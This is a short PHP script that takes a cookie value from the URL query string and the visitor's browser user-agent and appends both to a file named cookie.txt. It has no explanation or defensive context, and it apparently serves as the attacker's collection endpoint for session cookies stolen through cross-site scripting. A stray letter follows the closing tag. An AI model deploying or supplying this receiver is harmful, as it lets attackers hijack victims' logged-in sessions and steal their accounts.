<?php
$cookie=$_GET['cookie'];
$useragent=$_SERVER['HTTP_USER_AGENT'];
$file=fopen('cookie.txt','a');
fwrite($file,"User Agent:$useragent || COOKIE:$cookie \n");
fclose($file);
?>
T
